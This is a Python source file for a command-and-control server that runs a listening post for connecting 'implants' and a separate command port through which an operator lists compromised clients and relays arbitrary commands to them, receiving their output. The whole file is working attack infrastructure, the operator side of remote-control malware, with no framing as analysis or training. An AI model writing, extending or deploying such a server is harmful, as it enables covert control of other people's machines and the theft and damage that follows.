#!/bin/python3
import socket
import argparse
import ipaddress
from rich.console import Console
import threading
import time
import json

parser = argparse.ArgumentParser()
parser.add_argument("--ip", required=True, help="The IP address for the server to listen on")
parser.add_argument("--port", required=True, help="The Port for the server to listen on")
args = parser.parse_args()

class MyServer():
    #Get the host and port upon object creation
    def __init__(self, HOST, PORT):
        self.LPHOST = str(HOST)
        self.LPPORT = int(PORT)
        self.CMDHOST = '0.0.0.0'
        self.CMDPORT = 10000
        self.console = Console()
        self.sockets = {
        "lp_sock" : socket.socket(),
        "command_sock" : socket.socket()
        }
        self.lp_connections = {}
        self.client_sockets = []
        self.cmd_connections = []
    #function for handling Connections
    def lp_handle_connection(self, connection):
        implant_info = connection[0].recv(1024)
        implant_info = json.loads(implant_info.decode())
        self.lp_connections[f"{len(self.lp_connections)}"] = {
        "connection" : connection[1],
        "info" : implant_info
        }
        self.client_sockets.append(connection[0])

    def command_handle_connection(self, connection):
        self.cmd_connections.append(connection)
        while True:
            data = connection[0].recv(1024)
            if data.decode() == "get_clients":
                connection[0].send(json.dumps(self.lp_connections).encode())
            else:
                data = json.loads(data.decode())
                if 'command' in data:
                    self.client_sockets[int(data['client_id'])].send(data["command"].encode())
                    response = self.client_sockets[int(data['client_id'])].recv(50000)
                    connection[0].send(response)
    #function to bind socket to port
    def bind(self, sock, host, port):
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind((host, port))
            return True
        except:
            self.console.log(f"Unable to bind to {host}:{port}")
            self.console.log("Exiting...")
            return False
    #function to start listening
    def lp_listen(self, sock):
        try:
            sock.listen(10)
        except:
            self.console.log(f"Unable to start listening on {self.LPHOST}:{self.LPPORT}")
            self.console.log("Exiting...")
            return
        self.console.log(f"Successfully started listening post on {self.LPHOST}:{self.LPPORT}")
        while True:
            conn, addr = sock.accept()
            self.console.log(f"Connection to LP from {addr[0]}:{addr[1]}")
            thread = threading.Thread(target=self.lp_handle_connection, args=[(conn, addr)])
            thread.deamon = True
            thread.start()
    def command_listen(self, sock):
        try:
            sock.listen(10)
        except:
            self.console.log(f"Unable to start listening on {self.CMDHOST}:{self.CMDPORT}")
            self.console.log("Exiting...")
            return
        self.console.log(f"Successfully started Command Port on {self.CMDHOST}:{self.CMDPORT}")
        self.console.log("Waiting for connections...")
        while True:
            conn, addr = sock.accept()
            self.console.log(f"Connection to Command Port from {addr[0]}:{addr[1]}")
            thread = threading.Thread(target=self.command_handle_connection, args=[(conn, addr)])
            thread.deamon = True
            thread.start()
    #function to start the server
    def start(self):
        #start LP
        bind_status = self.bind(self.sockets['lp_sock'], self.LPHOST, self.LPPORT)
        if bind_status == True:
            lp_sock_thread = threading.Thread(target=self.lp_listen, args=[self.sockets['lp_sock']])
            lp_sock_thread.start()
        bind_status = self.bind(self.sockets['command_sock'], self.CMDHOST, self.CMDPORT)
        if bind_status == True:
            command_sock_thread = threading.Thread(target=self.command_listen, args=[self.sockets['command_sock']])
            command_sock_thread.start()

#our main function that calls everything
def main(args):
    console = Console()
    #Check to make sure we have a valid ip
    try:
        ipaddress.ip_address(args.ip)
    except:
        console.log("Invalid IP Address")
        console.log("Exiting...")
        return
    #create server and start it
    server = MyServer(args.ip, args.port)
    server.start()

if __name__ == "__main__":
    main(args)
